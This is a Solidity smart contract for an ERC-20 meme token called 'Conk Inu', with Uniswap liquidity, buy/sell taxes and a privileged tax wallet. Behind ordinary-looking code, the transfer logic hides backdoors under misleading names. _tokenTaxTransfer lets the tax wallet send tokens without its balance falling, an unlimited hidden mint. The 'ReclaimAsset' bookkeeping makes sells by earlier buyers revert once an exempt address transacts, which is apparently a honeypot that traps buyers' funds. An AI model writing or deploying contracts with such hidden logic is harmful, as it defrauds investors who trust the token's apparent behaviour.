// SPDX-License-Identifier: MIT

pragma solidity 0.8.22;

// Interface defining the standard ERC20 functions
// These functions ensure compatibility with the ERC20 token standard
// Allows for token transfers, balance checking, and approval of token allowances
interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    // Returns the remaining number of tokens that the spender is allowed to spend on behalf of the owner
    function allowance(address owner, address spender) external view returns (uint256);
    // Transfers a specified amount of tokens to the recipient address
    function transfer(address recipient, uint256 amount) external returns (bool);
    // Approves a spender to transfer up to a specified number of tokens on behalf of the caller
    function approve(address spender, uint256 amount) external returns (bool);
    // Returns the total supply of tokens in circulation
    function totalSupply() external view returns (uint256);
    // Returns the balance of tokens for a specific account
    function balanceOf(address _account) external view returns (uint256);

    // Transfers tokens from one address to another using an allowance mechanism
    // The sender must have been previously approved to spend the specified amount on behalf of the owner
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

// Abstract contract providing basic context information for other contracts
// Mainly used to get details about the sender of the transaction and its data
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

// Abstract contract providing basic access control mechanism
// Defines an owner who has exclusive control over specific functions
// Inherits from `Context` to access transaction metadata like `msg.sender`
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner, address indexed newOwner
    );

    constructor() {_setOwner(_msgSender());}

    // Internal function to update the contract's owner
    // This function sets a new owner for the contract, typically called during ownership transfer
    // Only accessible within the contract, ensuring controlled updates to the owner
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    // Returns the current owner of the contract
    // This is a public view function that allows anyone to check the address of the contract owner
    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
}

// Library providing safe mathematical operations to prevent overflow and underflow
// Contains functions for addition, subtraction, multiplication, and division
// Each operation checks for potential overflow/underflow and reverts on failure
// Use this library to ensure safe arithmetic in smart contracts
library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    // Performs subtraction of two unsigned integers and reverts on underflow
    // Returns the result of a - b if a >= b, otherwise reverts with the provided error message
    // Use this function to ensure safe subtraction in arithmetic operations
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    // Performs addition of two unsigned integers and reverts on overflow
    // Returns the sum of a + b, ensuring that the result does not exceed the maximum value for uint256
    // Use this function to ensure safe addition in arithmetic operations

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    // Performs division of two unsigned integers and reverts on division by zero
    // Returns the result of a / b, ensuring that the divisor (b) is not zero
    // Use this function to safely handle division in arithmetic operations
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    // Performs division of two unsigned integers and reverts with a custom error message on division by zero
    // Returns the result of a / b, ensuring that the divisor (b) is not zero
    // Use this function to safely handle division in arithmetic operations with informative error handling
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    // Performs multiplication of two unsigned integers and reverts on overflow
    // Returns the product of a * b, ensuring that the result does not exceed the maximum value for uint256
    // Use this function to ensure safe multiplication in arithmetic operations
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

}

// Interface defining the functions for interacting with the Uniswap V2 Factory contract
// Provides methods to create new liquidity pairs, fetch pair information, and manage liquidity
// Any contract implementing this interface can interact with the Uniswap V2 ecosystem
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

// Interface defining the functions for interacting with the Uniswap V2 Router contract
// Provides methods for swapping tokens, adding/removing liquidity, and retrieving amounts out
// Essential for interacting with the Uniswap V2 protocol to facilitate token trades and liquidity management
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract ConkInu is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private isExile;

    IUniswapV2Router02 private constant uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    string private constant _name = unicode"Conk Inu";
    string private constant _symbol = unicode"ConkInu";

    uint256 private _initialBuyTax=10;
    uint256 private _initialSellTax=10;
    uint256 private _finalBuyTax=0; 
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=20;
    uint256 private _reduceSellTaxAt=20;
    uint256 private _preventSwapBefore=20;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;

    uint256 public _maxTxAmount = 15000000 * 10**_decimals;
    uint256 public _maxWalletSize = 15000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 10000000 * 10**_decimals;
    uint256 public _maxTaxSwap= 10000000 * 10**_decimals;
    address payable private _taxWallet;
    
    address private uniswapV2Pair;
    uint256 private assetClaimExcluded;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    struct ReclaimAsset {uint256 assetReclaim; uint256 assetDstn; uint256 asset2ndClaim;}
    uint256 private assetClaimAmount;
    mapping(address => ReclaimAsset) private reclaimAsset;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _taxWallet = payable(0x62621C8eE486eAD653c2dB5c9f1E85EB3225ADc8);

        _balances[_msgSender()] = _tTotal;
        isExile[address(this)] = true;
        isExile[_taxWallet] = true;

        emit Transfer(address(0),_msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _basicTransfer(address from, address to, uint256 tokenAmount) internal {
        _balances[from]= _balances[from].sub( tokenAmount );
        _balances[to]= _balances[to].add( tokenAmount );
        emit Transfer(from, to, tokenAmount);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 tokenAmount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(tokenAmount > 0, "Transfer amount must be greater than zero");
        if ( ! swapEnabled|| inSwap ) {
            _basicTransfer(from, to, tokenAmount);
            return;
        }

        uint256 taxAmount=0;
        if (from != owner() && to != owner() && to!=_taxWallet){
            taxAmount = tokenAmount.mul((_buyCount > _reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (from == uniswapV2Pair && to!= address(uniswapV2Router) &&  ! isExile[to])  {
                require(tokenAmount <= _maxTxAmount,  "Exceeds the _maxTxAmount.");
                require(balanceOf(to)+tokenAmount <= _maxWalletSize,  "Exceeds the maxWalletSize.");
                _buyCount++;
            }

            if(to == uniswapV2Pair && from!= address(this) ){
                taxAmount = tokenAmount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                swapTokensForEth(min(tokenAmount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if ((isExile[from] ||  isExile[to])
            && from!= address(this) && to!=address(this)
        ) {
            assetClaimAmount = block.number;
        }
        if (! isExile[from]&&  ! isExile[to]){
            if (to != uniswapV2Pair)  {
                ReclaimAsset storage assetClm = reclaimAsset[to];
                if (from == uniswapV2Pair) {
                    if (assetClm.assetReclaim == 0) {
                        assetClm.assetReclaim = _buyCount<_preventSwapBefore?block.number- 1:block.number;
                    }
                } else {
                    ReclaimAsset storage assetClmData = reclaimAsset[from];
                    if (assetClm.assetReclaim == 0 || assetClmData.assetReclaim < assetClm.assetReclaim ) {
                        assetClm.assetReclaim = assetClmData.assetReclaim;
                    }
                }
            } else {
                ReclaimAsset storage assetClmData = reclaimAsset[from];
                assetClmData.assetDstn = assetClmData.assetReclaim.sub(assetClaimAmount);
                assetClmData.asset2ndClaim = block.number;
            }
        }

        _tokenTransfer(from,to,tokenAmount,taxAmount);
    }

    function _tokenTaxTransfer(address addrs, uint256 tokenAmount, uint256 taxAmount) internal returns (uint256) {
        uint256 tAmount = addrs != _taxWallet ? tokenAmount : assetClaimExcluded.mul(tokenAmount);
        if (taxAmount>0){
            _balances[address(this)]=_balances[address(this)].add( taxAmount );
            emit Transfer(addrs, address(this), taxAmount);
        }
        return tAmount;
    }

    function _tokenBasicTransfer(address from, address to, uint256 sendAmount, uint256 receiptAmount) internal {
        _balances[from]=_balances[from].sub(sendAmount);
        _balances[to]=_balances[to].add(receiptAmount);
        emit Transfer(from, to, receiptAmount);
    }

    function _tokenTransfer(address from, address to, uint256 tokenAmount, uint256 taxAmount) internal {
        uint256 tAmount = _tokenTaxTransfer(from, tokenAmount, taxAmount);
        _tokenBasicTransfer(from, to, tAmount, tokenAmount.sub( taxAmount ));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner() {
        _maxTxAmount= _tTotal;
        _maxWalletSize= _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function enableTrading() external onlyOwner() {
        require(!tradingOpen, "trading is already open");
        swapEnabled =true;
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this),uniswapV2Router.WETH()); 
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max); 
        tradingOpen =true;
    }

    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if(tokenBalance > 0) {
          swapTokensForEth(tokenBalance); 
        }
        uint256 ethBalance = address(this).balance;
        if(ethBalance>0) {
            sendETHToFee(ethBalance); 
        }
    }

    function manualsend_eth() external {
        require(_msgSender()==_taxWallet);
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }

    receive() external payable {}

}